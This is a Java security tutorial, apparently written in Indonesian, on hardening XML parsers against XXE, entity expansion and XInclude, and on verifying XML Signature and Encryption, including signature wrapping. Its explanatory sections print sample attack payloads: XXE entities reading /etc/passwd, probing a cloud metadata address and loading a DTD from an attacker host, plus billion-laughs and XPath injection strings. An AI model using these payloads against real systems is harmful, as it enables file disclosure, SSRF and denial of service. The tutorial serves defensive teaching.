# learn-java-security-cryptography-integrity-part-018.md

# Part 18 — XML Security, XXE, XML Signature, XML Encryption

> Seri: `learn-java-security-cryptography-integrity`  
> Part: `018 / 034`  
> Status seri: **belum selesai**  
> Fokus: keamanan XML di Java enterprise, terutama parser hardening, XXE, entity expansion, XML Signature, XML Encryption, canonicalization, signature wrapping, dan integrity semantics.

---

## 0. Kenapa Part Ini Penting?

XML sering dianggap “teknologi lama”, tetapi di banyak sistem enterprise dan regulatory, XML masih hidup di tempat-tempat kritis:

- SOAP web service.
- SAML assertion.
- e-invoice / e-tax / e-regulatory filing.
- document exchange antar agency.
- signed XML document.
- legacy integration.
- message broker payload.
- archive manifest.
- batch transfer.
- certificate/key metadata.
- report template.
- workflow definition.
- rule configuration.
- identity federation.
- payment/financial integration.
- government data exchange.

Masalahnya, XML bukan sekadar format data. XML membawa banyak fitur kompleks:

- DTD.
- entity.
- external entity.
- schema.
- namespace.
- XPath.
- XInclude.
- canonicalization.
- transform.
- signature.
- encryption.
- reference URI.
- ID attribute.
- mixed content.
- processing instruction.
- parser configuration.
- resolver.
- external resource lookup.

Fitur-fitur ini membuat XML kuat, tetapi juga membuatnya berbahaya jika diproses seperti JSON biasa.

Kesalahan umum engineer:

```text
"XML cuma input text. Parse saja pakai DocumentBuilder."
```

Mental model yang benar:

```text
Untrusted XML adalah program kecil yang bisa meminta parser melakukan kerja:
- membuka file,
- melakukan network request,
- memperluas entity,
- mengubah struktur logical document,
- memengaruhi node yang dipilih,
- mengubah canonical byte stream,
- dan membuat signature tampak valid pada node yang bukan node yang dipakai aplikasi.
```

Jadi XML security bukan hanya soal “disable XXE”. Itu baru lapisan awal.

---

## 1. Tujuan Part Ini

Setelah mempelajari part ini, kamu harus mampu:

1. Menjelaskan kenapa XML parsing adalah trust boundary.
2. Membedakan XXE, entity expansion, XInclude abuse, XPath injection, schema poisoning, signature wrapping, dan XML Encryption misuse.
3. Mengkonfigurasi parser Java secara aman untuk DOM, SAX, StAX, Transformer, SchemaFactory, JAXB-style flow, dan XPath usage.
4. Memahami XML Signature sebagai integrity/authenticity mechanism, bukan sekadar “validasi tanda tangan”.
5. Memahami canonicalization dan kenapa XML Signature lebih rumit daripada tanda tangan JSON sederhana.
6. Mengenali signature wrapping attack: signature valid, tetapi aplikasi membaca node yang salah.
7. Mendesain flow XML security yang defensible untuk integration system.
8. Membuat checklist review Java XML processing.
9. Membuat invariant untuk XML document exchange.
10. Menentukan kapan XML Encryption layak dipakai dan kapan lebih baik memakai transport/message envelope security lain.

---

## 2. Mental Model Utama

### 2.1 XML security adalah kombinasi tiga layer

```text
Layer 1 — Parser safety
Can the XML parser be abused before application logic runs?

Layer 2 — Document semantic safety
Is the document structure, namespace, schema, and selected business node really the expected one?

Layer 3 — Cryptographic safety
Does signature/encryption protect the exact data that application consumes?
```

Banyak sistem hanya mengamankan Layer 1, lalu tetap rentan di Layer 2 atau 3.

---

### 2.2 XML parser bukan passive decoder

Parser XML bisa:

- membaca DTD;
- resolve external entity;
- dereference URI;
- expand entity;
- process namespace;
- load external schema;
- process XInclude;
- normalize attribute;
- collapse whitespace tergantung mode;
- membentuk tree DOM;
- expose node dengan namespace-aware semantics;
- menghasilkan canonical representation untuk signature.

Karena itu, XML parser harus diperlakukan sebagai komponen berisiko tinggi.

---

### 2.3 XML Signature bukan “hash seluruh file”

XML Signature bisa menandatangani:

- seluruh document;
- elemen tertentu;
- node set tertentu;
- external resource;
- detached object;
- enveloped signature;
- enveloping signature;
- multiple references.

Artinya, ketika signature valid, pertanyaan yang benar bukan:

```text
"Apakah XML ini signed?"
```

Pertanyaan yang benar:

```text
"Node mana yang signed?"
"Apakah node yang signed sama dengan node yang saya proses?"
"Apakah signer dipercaya untuk maksud bisnis ini?"
"Apakah transform/canonicalization aman?"
"Apakah reference resolution dibatasi?"
"Apakah ID binding tidak ambigu?"
```

---

## 3. Vocabulary Penting

| Istilah | Makna |
|---|---|
| XML | Markup language berbasis tree dengan element, attribute, namespace, dan text node. |
| DTD | Document Type Definition; dapat mendefinisikan entity. |
| Entity | Placeholder yang dapat diexpand parser menjadi content lain. |
| External Entity | Entity yang menunjuk resource eksternal seperti file atau URL. |
| XXE | XML External Entity attack; parser lemah resolve external entity dari input tidak tepercaya. |
| Billion Laughs | Exponential entity expansion DoS. |
| Quadratic Blowup | Entity expansion DoS dengan growth besar tapi tidak selalu exponential. |
| XInclude | Mekanisme memasukkan external XML fragment ke document. |
| XPath | Bahasa query node XML. |
| Namespace | Mekanisme membedakan elemen/attribute dengan URI namespace. |
| Canonicalization | Proses mengubah XML menjadi bentuk canonical untuk digest/signature. |
| XML Signature | Standard untuk signature XML node/resource. |
| XML Encryption | Standard untuk mengenkripsi XML data/key. |
| Signature Wrapping | Serangan di mana signed node dipindah/dibungkus, lalu aplikasi memproses unsigned malicious node. |
| Secure Validation | Mode Java XML Signature yang membatasi konstruk berisiko. |
| Reference URI | URI di XML Signature yang menentukan data yang ditandatangani. |
| Transform | Transformasi data sebelum digest/signature verification. |
| ID Attribute | Attribute yang dipakai sebagai target reference `#id`. |

---

## 4. Threat Landscape XML di Java

### 4.1 Threat utama

| Threat | Dampak |
|---|---|
| XXE file disclosure | Attacker membaca `/etc/passwd`, config, key, metadata, credential file. |
| XXE SSRF | Parser melakukan request internal ke metadata service/admin endpoint. |
| Entity expansion DoS | CPU/memory habis saat expand entity. |
| External schema fetch | SSRF atau dependency pada remote resource. |
| XInclude abuse | File inclusion. |
| XPath injection | Query node berubah karena input tidak di-escape. |
| Namespace confusion | Aplikasi membaca elemen dengan local name benar tapi namespace salah. |
| Signature wrapping | Signature valid, business payload malicious. |
| Weak XML Signature algorithm | RSA-SHA1/MD5/digest lemah diterima. |
| Unsafe transform | Transform melakukan resource access atau DoS. |
| KeyInfo trust abuse | Aplikasi mempercayai certificate dari attacker di XML. |
| XML Encryption oracle | Error detail menjadi side-channel. |
| Logging sensitive XML | XML mengandung PII/secret/signature/key material. |

---

### 4.2 Security invariant untuk XML

Gunakan invariant seperti ini:

```text
Invariant XML-1:
Untrusted XML must not cause the parser to read local files, open network connections,
or expand attacker-controlled entities beyond bounded resource limits.

Invariant XML-2:
Only XML documents matching the expected schema, namespace, and business root element
may enter business processing.

Invariant XML-3:
If a signed XML document is accepted, the application must process only the exact
signed element/resource whose signature, reference, algorithm policy, certificate chain,
and signer authorization have been validated.

Invariant XML-4:
A valid XML signature only proves that a specific key signed a specific canonicalized
resource; it does not automatically prove business authorization.

Invariant XML-5:
XML Encryption must not be used without independent integrity/authenticity protection
and strict error handling.
```

---

## 5. Parser Safety: General Rule

Sebelum membahas API Java, pegang rule ini:

```text
Default stance:
- reject DTD for untrusted XML;
- disable external entities;
- disable external parameter entities;
- disable external DTD loading;
- disable XInclude;
- disable expansion when not needed;
- block external resource resolution;
- enable namespace awareness when security logic depends on namespace;
- impose size, depth, node count, time, and memory limits outside parser;
- validate expected schema only from local trusted source;
- never fetch schema/DTD from document-provided URL.
```

Salah satu jebakan Java adalah parser API berbeda punya property berbeda. Tidak cukup mengamankan `DocumentBuilderFactory` jika flow lain memakai `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`, atau `XPath`.

---

## 6. DOM Parser Hardening: `DocumentBuilderFactory`

### 6.1 Masalah

DOM membangun seluruh tree XML di memory.

Risiko:

- memory exhaustion;
- entity expansion;
- external entity;
- DTD fetch;
- XInclude;
- namespace confusion;
- parsing seluruh payload sebelum validasi size/depth.

DOM cocok jika:

- XML tidak terlalu besar;
- perlu random access tree;
- signature API membutuhkan DOM;
- resource limit sudah dikontrol.

DOM tidak cocok untuk huge XML stream.

---

### 6.2 Baseline secure configuration

```java
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public final class SecureXmlDom {

    private SecureXmlDom() {
    }

    public static DocumentBuilder newSecureDocumentBuilder() throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Required for security-sensitive XML processing.
        factory.setNamespaceAware(true);

        // Disable DTD entirely for untrusted XML.
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // Disable external general entities.
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);

        // Disable external parameter entities.
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // Disable loading external DTD.
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // Prevent XInclude.
        factory.setXIncludeAware(false);

        // Do not expand entity references into DOM tree.
        factory.setExpandEntityReferences(false);

        // Restrict external access where supported.
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        DocumentBuilder builder = factory.newDocumentBuilder();

        // Extra defense: reject any entity resolution.
        builder.setEntityResolver((publicId, systemId) -> {
            throw new org.xml.sax.SAXException(
                    "External entity resolution is disabled: " + systemId
            );
        });

        return builder;
    }
}
```

---

### 6.3 Kenapa semua ini perlu?

| Setting | Tujuan |
|---|---|
| `setNamespaceAware(true)` | Mencegah logic security buta namespace. |
| `disallow-doctype-decl` | Menolak DTD, sehingga banyak XXE/entity attack berhenti awal. |
| `external-general-entities=false` | Mencegah general entity eksternal. |
| `external-parameter-entities=false` | Mencegah parameter entity eksternal. |
| `load-external-dtd=false` | Mencegah fetch external DTD. |
| `setXIncludeAware(false)` | Mencegah include external document. |
| `setExpandEntityReferences(false)` | Menghindari expansion ke tree. |
| `ACCESS_EXTERNAL_DTD=""` | Blokir external DTD access. |
| `ACCESS_EXTERNAL_SCHEMA=""` | Blokir external schema access. |
| `EntityResolver` | Defense-in-depth jika property tidak cukup/berbeda provider. |

---

### 6.4 Failure mode: feature tidak didukung

Beberapa parser/provider mungkin melempar exception untuk feature tertentu.

Anti-pattern:

```java
try {
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
} catch (Exception ignored) {
    // continue anyway
}
```

Ini berbahaya. Jika feature security gagal dipasang, parser tidak boleh digunakan untuk untrusted XML.

Pattern yang benar:

```java
try {
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
} catch (ParserConfigurationException e) {
    throw new IllegalStateException("Secure XML parser feature is not supported", e);
}
```

Security configuration failure harus fail closed.

---

## 7. SAX Parser Hardening

SAX stream-based, lebih hemat memory, tetapi tetap bisa terkena XXE/entity abuse jika konfigurasi lemah.

```java
import javax.xml.XMLConstants;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

public final class SecureXmlSax {

    private SecureXmlSax() {
    }

    public static SAXParser newSecureSaxParser() throws Exception {
        SAXParserFactory factory = SAXParserFactory.newInstance();
        factory.setNamespaceAware(true);

        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        factory.setXIncludeAware(false);

        SAXParser parser = factory.newSAXParser();
        parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        return parser;
    }
}
```

---

## 8. StAX Parser Hardening: `XMLInputFactory`

StAX sering dipakai untuk XML besar karena pull-based.

Risiko tetap ada:

- external entity;
- DTD;
- external reference;
- memory/CPU abuse;
- logic bug saat event stream tidak divalidasi.

```java
import javax.xml.XMLConstants;
import javax.xml.stream.XMLInputFactory;

public final class SecureXmlStax {

    private SecureXmlStax() {
    }

    public static XMLInputFactory newSecureXmlInputFactory() {
        XMLInputFactory factory = XMLInputFactory.newFactory();

        // Disable DTD support.
        factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);

        // Disable external entities.
        factory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);

        // Restrict external resource access where supported.
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        return factory;
    }
}
```

Catatan:

- StAX property support bisa berbeda antar implementation.
- Fail closed jika property security tidak didukung.
- StAX tetap butuh limit ukuran input dari layer luar.

---

## 9. TransformerFactory, SchemaFactory, Validator, XPath

Banyak sistem mengamankan parser utama tetapi lupa API lain.

### 9.1 `TransformerFactory`

XSLT dapat membaca external resources melalui stylesheet/import/include/document function.

```java
import javax.xml.XMLConstants;
import javax.xml.transform.TransformerFactory;

public final class SecureXmlTransformer {

    public static TransformerFactory newSecureTransformerFactory() {
        TransformerFactory factory = TransformerFactory.newInstance();

        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

        return factory;
    }
}
```

Jika transform dari untrusted XSLT, pendekatan terbaik adalah:

```text
Do not allow untrusted XSLT.
```

XSLT adalah bahasa transformasi yang jauh lebih kompleks daripada sekadar template.

---

### 9.2 `SchemaFactory`

Jangan biarkan XML menunjuk schema eksternal.

```java
import javax.xml.XMLConstants;
import javax.xml.validation.SchemaFactory;

public final class SecureXmlSchema {

    public static SchemaFactory newSecureSchemaFactory() {
        SchemaFactory factory =
                SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);

        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        return factory;
    }
}
```

Gunakan schema lokal yang dibundle dan dipercaya.

Jangan:

```xml
xsi:schemaLocation="http://attacker.example/malicious.xsd"
```

lalu aplikasi mengikutinya.

---

### 9.3 XPath

XPath injection terjadi saat input user digabungkan ke expression.

Anti-pattern:

```java
String expr = "//User[name='" + userInput + "']";
Node node = (Node) xpath.evaluate(expr, document, XPathConstants.NODE);
```

Jika `userInput` berisi:

```text
' or '1'='1
```

maka query berubah.

Pattern:

- Jangan bangun XPath dari raw input.
- Gunakan lookup manual setelah memilih node struktural aman.
- Jika perlu parameterisasi, buat abstraction sendiri untuk escaping literal XPath.
- Gunakan absolute XPath untuk security-critical node.
- Jangan pakai `//*[local-name()='Assertion']` untuk security-critical SAML/XML signature tanpa validasi namespace dan posisi.

---

## 10. JAXB / Binding Layer Safety

JAXB-style binding sering terlihat aman karena developer tidak langsung memakai parser.

Masalahnya:

```text
Unmarshaller tetap membutuhkan XML parser di bawahnya.
```

Pattern lebih aman:

1. Buat parser hardened.
2. Parse menjadi `Source`/`XMLStreamReader` yang aman.
3. Berikan ke binding layer.
4. Validasi schema lokal.
5. Validasi business constraints.

Contoh dengan StAX:

```java
XMLInputFactory inputFactory = SecureXmlStax.newSecureXmlInputFactory();

try (InputStream in = requestBody) {
    XMLStreamReader reader = inputFactory.createXMLStreamReader(in);

    JAXBContext context = JAXBContext.newInstance(MyDto.class);
    Unmarshaller unmarshaller = context.createUnmarshaller();

    MyDto dto = unmarshaller.unmarshal(reader, MyDto.class).getValue();

    // Business validation still required.
    validate(dto);
}
```

Jangan menganggap binding library otomatis aman untuk semua provider/version/configuration.

---

## 11. Resource Limits: Parser Setting Tidak Cukup

Parser hardening harus dilengkapi batas resource.

### 11.1 Limit yang perlu ada

| Limit | Kenapa |
|---|---|
| Max request size | Mencegah upload besar. |
| Max XML size | Mencegah memory exhaustion. |
| Max nesting depth | Mencegah deeply nested attack. |
| Max number of elements | Mencegah tree explosion. |
| Max number of attributes | Mencegah attribute abuse. |
| Max text node length | Mencegah huge text payload. |
| Max processing time | Mencegah slow parse. |
| Max file count dalam archive | Mencegah archive bomb. |
| Max decompressed size | Mencegah compression bomb. |

### 11.2 Jangan parse sebelum size check

Anti-pattern:

```java
Document doc = builder.parse(request.getInputStream());
if (request.getContentLengthLong() > MAX) reject();
```

Terlambat. Payload sudah diparse.

Pattern:

```text
1. enforce HTTP body limit at reverse proxy/API gateway;
2. enforce servlet/container request size limit;
3. enforce application read limit;
4. parse only bounded stream;
5. validate logical resource limits.
```

---

## 12. XXE Deep Dive

### 12.1 Contoh payload file disclosure

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request>
  <name>&xxe;</name>
</request>
```

Jika parser resolve external entity, isi file lokal masuk ke document.

---

### 12.2 Contoh SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<request>
  <name>&xxe;</name>
</request>
```

Di cloud/container environment, ini bisa dipakai untuk metadata service probing.

---

### 12.3 Parameter entity lebih licik

```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd">
  %ext;
]>
<foo>bar</foo>
```

Karena itu external parameter entity harus dimatikan, bukan hanya general entity.

---

### 12.4 XInclude abuse

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

`setXIncludeAware(false)` penting untuk parser yang mendukung XInclude.

---

## 13. Entity Expansion DoS

### 13.1 Billion laughs

```xml
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>
```

Serangan ini tidak butuh file/network access. Fokusnya CPU/memory.

### 13.2 Defense

- Reject DTD untuk untrusted XML.
- Batasi input size.
- Gunakan parser limit/properties.
- Monitor parse latency.
- Treat parse failure as suspicious signal.
- Jangan log seluruh malicious XML.

---

## 14. Namespace Security

XML namespace sering diremehkan.

Contoh:

```xml
<Payment xmlns="urn:trusted:payment">
  <Amount>100</Amount>
</Payment>
```

vs

```xml
<Payment xmlns="urn:attacker:payment">
  <Amount>100</Amount>
</Payment>
```

Jika aplikasi hanya cek local name:

```java
document.getElementsByTagName("Payment")
```

ia bisa membaca elemen namespace salah.

Gunakan namespace-aware parser dan validasi namespace.

```java
Element root = document.getDocumentElement();

if (!"Payment".equals(root.getLocalName())) {
    throw new SecurityException("Unexpected root element");
}

if (!"urn:trusted:payment".equals(root.getNamespaceURI())) {
    throw new SecurityException("Unexpected namespace");
}
```

---

## 15. XML Schema Validation: Berguna, Tapi Bukan Cukup

Schema bisa membantu:

- struktur;
- tipe;
- required field;
- cardinality;
- namespace;
- basic pattern;
- max length.

Schema tidak cukup untuk:

- authorization;
- replay prevention;
- signature trust;
- business invariant;
- semantic validation;
- fraud detection;
- key/certificate trust;
- external resource safety jika schema loading tidak dibatasi.

Gunakan schema sebagai layer, bukan sebagai seluruh security.

---

## 16. XML Signature: Konsep Dasar

XML Signature memberi:

- integrity;
- message authentication;
- signer authentication jika key/certificate dipercaya;
- non-repudiation dalam konteks tertentu jika private key custody, policy, dan legal framework mendukung.

Struktur umum:

```xml
<Signature>
  <SignedInfo>
    <CanonicalizationMethod/>
    <SignatureMethod/>
    <Reference URI="#payload">
      <Transforms/>
      <DigestMethod/>
      <DigestValue/>
    </Reference>
  </SignedInfo>
  <SignatureValue/>
  <KeyInfo/>
</Signature>
```

Flow verification:

```text
1. Find Signature element safely.
2. Validate structure.
3. Resolve Reference URI safely.
4. Apply allowed transforms.
5. Canonicalize referenced data.
6. Compute digest.
7. Compare DigestValue.
8. Canonicalize SignedInfo.
9. Verify SignatureValue using trusted key.
10. Bind verified signed node to business processing.
11. Check signer authorization and certificate policy.
```

---

## 17. XML Signature Forms

### 17.1 Enveloped signature

Signature berada di dalam document yang ditandatangani.

```xml
<Invoice Id="inv-123">
  <Amount>1000</Amount>
  <Signature>...</Signature>
</Invoice>
```

Biasanya butuh enveloped-signature transform untuk mengeluarkan `<Signature>` dari digest.

---

### 17.2 Enveloping signature

Signature membungkus object yang ditandatangani.

```xml
<Signature>
  <Object Id="payload">
    <Invoice>...</Invoice>
  </Object>
</Signature>
```

---

### 17.3 Detached signature

Signature terpisah dari data.

```xml
<Signature>
  <SignedInfo>
    <Reference URI="invoice.xml"/>
  </SignedInfo>
</Signature>
```

Detached signature lebih berisiko jika resolver bisa fetch URI sembarangan.

---

## 18. Canonicalization

XML yang logically sama bisa berbeda secara byte:

```xml
<A x="1" y="2"></A>
```

dan:

```xml
<A y="2" x="1"/>
```

Dalam XML, attribute order tidak semantik. Signature butuh byte stream stabil, maka dipakai canonicalization.

Canonicalization menangani:

- attribute ordering;
- namespace declaration;
- whitespace tertentu;
- empty element representation;
- comments inclusion/exclusion;
- character normalization.

Risiko:

- canonicalization mismatch;
- namespace edge case;
- signed representation berbeda dari displayed representation;
- transforms yang terlalu fleksibel.

Rule:

```text
Minimize transforms.
Prefer explicit canonicalization.
Do not accept arbitrary transforms from untrusted parties.
```

---

## 19. Java XML Digital Signature API

Java menyediakan XML Digital Signature API (`javax.xml.crypto.dsig`) untuk generate/validate XML Signature.

Komponen penting:

| API | Peran |
|---|---|
| `XMLSignatureFactory` | Membuat/parse signature. |
| `DOMValidateContext` | Context validasi signature DOM. |
| `KeySelector` | Memilih key untuk verification. |
| `URIDereferencer` | Resolve Reference URI. |
| `Reference` | Data yang ditandatangani. |
| `SignedInfo` | Metadata canonicalization, method, reference. |
| `XMLSignature` | Signature object. |

---

### 19.1 Baseline verification skeleton

```java
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;

import javax.xml.crypto.dsig.XMLSignature;
import javax.xml.crypto.dsig.XMLSignatureFactory;
import javax.xml.crypto.dsig.dom.DOMValidateContext;
import java.security.PublicKey;

public final class XmlSignatureVerifier {

    public static boolean verify(Document document, PublicKey trustedPublicKey) throws Exception {
        NodeList signatures = document.getElementsByTagNameNS(
                XMLSignature.XMLNS,
                "Signature"
        );

        if (signatures.getLength() != 1) {
            throw new SecurityException("Expected exactly one XML Signature");
        }

        DOMValidateContext context =
                new DOMValidateContext(trustedPublicKey, signatures.item(0));

        // Keep secure validation enabled. Explicitly set true for clarity.
        context.setProperty("org.jcp.xml.dsig.secureValidation", Boolean.TRUE);

        // Optional: install restrictive URI dereferencer.
        context.setURIDereferencer(new SameDocumentOnlyUriDereferencer());

        XMLSignatureFactory factory = XMLSignatureFactory.getInstance("DOM");
        XMLSignature signature = factory.unmarshalXMLSignature(context);

        return signature.validate(context);
    }
}
```

Important:

```text
Verification returning true is not the end.
You must still bind the verified Reference to the exact business element.
```

---

### 19.2 Restrict URI dereferencing

Detached signature can cause external resource access if URI dereferencing is unrestricted.

For many business flows, accept only same-document reference:

```java
import javax.xml.crypto.Data;
import javax.xml.crypto.URIReference;
import javax.xml.crypto.URIReferenceException;
import javax.xml.crypto.URIDereferencer;
import javax.xml.crypto.XMLCryptoContext;

public final class SameDocumentOnlyUriDereferencer implements URIDereferencer {

    private final URIDereferencer delegate =
            javax.xml.crypto.dsig.XMLSignatureFactory
                    .getInstance("DOM")
                    .getURIDereferencer();

    @Override
    public Data dereference(URIReference uriReference, XMLCryptoContext context)
            throws URIReferenceException {

        String uri = uriReference.getURI();

        if (uri == null || uri.isBlank()) {
            throw new URIReferenceException("Empty URI reference is not allowed");
        }

        if (!uri.startsWith("#")) {
            throw new URIReferenceException("Only same-document URI references are allowed");
        }

        return delegate.dereference(uriReference, context);
    }
}
```

---

## 20. Secure Validation Mode

Java XML Signature has a secure validation mode that applies restrictions intended to make signature validation safer.

Practical implication:

- Do not disable it for convenience.
- If legacy partner signature fails because of weak algorithm/transform, treat that as integration risk, not just technical nuisance.
- Put exception behind formal risk acceptance and migration plan.

Anti-pattern:

```java
context.setProperty("org.jcp.xml.dsig.secureValidation", Boolean.FALSE);
```

Better:

```java
context.setProperty("org.jcp.xml.dsig.secureValidation", Boolean.TRUE);
```

If a partner still uses RSA-SHA1 or weak digest, the correct engineering response is:

```text
1. confirm exact failing algorithm;
2. assess risk;
3. define migration deadline;
4. isolate endpoint;
5. monitor usage;
6. document exception;
7. avoid weakening global JVM policy if possible.
```

---

## 21. KeyInfo Is Not Trust

A common dangerous pattern:

```text
XML contains KeyInfo
→ application extracts certificate/public key
→ signature validates
→ document accepted
```

This proves only:

```text
The document was signed by the private key corresponding to the public key embedded by the sender.
```

It does not prove:

- signer is trusted;
- certificate chains to trusted CA;
- certificate is authorized for this business purpose;
- certificate is not expired/revoked;
- key usage allows signing;
- organization identity matches expected partner;
- signer may submit this document type.

Correct model:

```text
Signature verification = cryptographic check.
Trust validation = PKI/truststore/pinning/partner registry check.
Authorization = business policy check.
```

You need all three.

---

## 22. Signature Wrapping Attack

### 22.1 Core idea

Attacker starts with valid signed XML:

```xml
<Envelope>
  <Body>
    <Payment Id="p1">
      <Amount>100</Amount>
    </Payment>
  </Body>
  <Signature>
    <Reference URI="#p1"/>
    ...
  </Signature>
</Envelope>
```

Attacker modifies:

```xml
<Envelope>
  <Header>
    <Payment Id="p1">
      <Amount>100</Amount>
    </Payment>
  </Header>

  <Body>
    <Payment Id="p2">
      <Amount>1000000</Amount>
    </Payment>
  </Body>

  <Signature>
    <Reference URI="#p1"/>
    ...
  </Signature>
</Envelope>
```

Signature still validates for `#p1`, but application reads first/body/current `Payment` node `p2`.

### 22.2 Why it happens

Because code separates:

```text
Signature validation target
```

from:

```text
Business processing target
```

### 22.3 Vulnerable pattern

```java
boolean valid = verifySignature(document);
if (!valid) reject();

Node payment = document.getElementsByTagName("Payment").item(0);
process(payment);
```

The selected node may not be the signed node.

### 22.4 Secure pattern

```text
1. Validate signature.
2. Extract Reference URI.
3. Resolve signed element by ID using safe ID handling.
4. Check there is exactly one element with that ID.
5. Check signed element is at expected absolute location.
6. Process only that signed element.
7. Reject duplicate/confusing nodes.
```

---

## 23. ID Attribute Pitfalls

XML Signature often references `#someId`.

But XML does not automatically know that every attribute named `Id`, `ID`, or `id` is an ID unless:

- schema declares it;
- parser marks it;
- application calls `setIdAttribute`;
- library has special handling.

Pitfalls:

- duplicate ID attributes;
- wrong casing;
- namespace mismatch;
- attacker adds unsigned element with expected ID-like attribute;
- resolver finds unexpected node.

Pattern:

```java
Element payload = findExpectedPayloadElement(document);

payload.setIdAttribute("Id", true);
```

But this must be combined with:

```text
- duplicate ID rejection;
- expected location check;
- namespace check;
- root/schema validation;
- reference URI binding.
```

---

## 24. Algorithm Policy for XML Signature

Do not accept arbitrary algorithms because the XML declares them.

Reject:

- MD5 digest;
- SHA-1 digest for new systems;
- RSA-SHA1 signatures;
- weak RSA key sizes;
- HMAC truncation unless explicitly safe and policy-approved;
- unknown canonicalization methods;
- unknown transform chains;
- XSLT transforms from untrusted signatures;
- remote references.

Allowlist approach:

```text
Digest:
- SHA-256 or stronger.

Signature:
- RSA-PSS with SHA-256/384/512 where supported;
- RSA-SHA256 minimum for legacy;
- ECDSA-SHA256/384 where ecosystem supports;
- EdDSA where supported and interoperable.

Canonicalization:
- explicit approved canonicalization method.

Reference:
- same-document reference only unless detached signature use case is explicitly required.
```

---

## 25. XML Encryption

XML Encryption allows encrypting:

- element;
- element content;
- arbitrary data;
- symmetric key;
- key transport/wrapping.

Example shape:

```xml
<EncryptedData Type="...">
  <EncryptionMethod Algorithm="..."/>
  <KeyInfo>
    <EncryptedKey>...</EncryptedKey>
  </KeyInfo>
  <CipherData>
    <CipherValue>...</CipherValue>
  </CipherData>
</EncryptedData>
```

### 25.1 What XML Encryption gives

- confidentiality for selected XML part;
- structure-preserving encryption;
- message-level confidentiality independent from TLS.

### 25.2 What it does not automatically give

- sender authenticity;
- full document integrity;
- replay protection;
- business authorization;
- safe parser behavior;
- safe canonicalization;
- safe key management.

### 25.3 Encrypt-then-sign or sign-then-encrypt?

There is no universal answer. It depends on requirements.

#### Sign then encrypt

```text
Plaintext -> sign -> encrypt signed payload
```

Pros:

- signature hidden from observers;
- signature covers plaintext.

Cons:

- recipient must decrypt before verifying signature;
- may expose decryption oracle if errors leak;
- intermediaries cannot verify signature.

#### Encrypt then sign

```text
Plaintext -> encrypt -> sign ciphertext
```

Pros:

- recipient can verify sender/message integrity before decrypting;
- ciphertext tamper detected early.

Cons:

- signature metadata may reveal signer;
- signature covers ciphertext, not directly plaintext semantics unless envelope is well-defined.

### 25.4 Practical guidance

For new systems, prefer simpler envelope designs when possible:

```text
- TLS for transport confidentiality/integrity.
- JWS/JWE/COSE for modern message security if XML structure preservation is not required.
- XML Signature/Encryption only when ecosystem/regulation/protocol requires XML-native security.
```

If XML Encryption is required:

- use strong algorithms;
- authenticate encrypted data;
- do not leak detailed decrypt errors;
- bind encryption to expected recipient/key;
- sign or MAC the envelope;
- treat decrypted XML as untrusted input and parse safely again if needed.

---

## 26. SOAP and WS-Security Context

SOAP/WS-Security often combines:

- XML Signature;
- XML Encryption;
- timestamp;
- security token;
- binary security token;
- SAML assertion;
- username token;
- body signing;
- header signing.

Risiko:

- only body signed, important header unsigned;
- timestamp not checked;
- replay cache absent;
- SAML assertion signed but SOAP body not bound;
- signature wrapping;
- intermediary modifies unsigned header;
- trust based on embedded certificate;
- weak algorithm accepted for interoperability.

Invariant:

```text
A SOAP message is acceptable only if every security-critical element consumed
by the application is signed by an authorized signer and bound to freshness,
recipient, and intended action.
```

---

## 27. SAML-Specific Lessons

SAML is XML-heavy and signature-heavy.

Common mistakes:

- accepting unsigned assertion;
- accepting signed response but processing unsigned assertion;
- accepting signed assertion but not validating audience;
- ignoring recipient/destination;
- ignoring `InResponseTo`;
- allowing old assertion;
- not validating issuer;
- trusting `KeyInfo`;
- signature wrapping;
- selecting assertion with `getElementsByTagName`.

Rule:

```text
SAML validation must be done by mature library with secure defaults.
Do not hand-roll SAML verification.
```

Even when using a library:

- configure trusted IdP metadata;
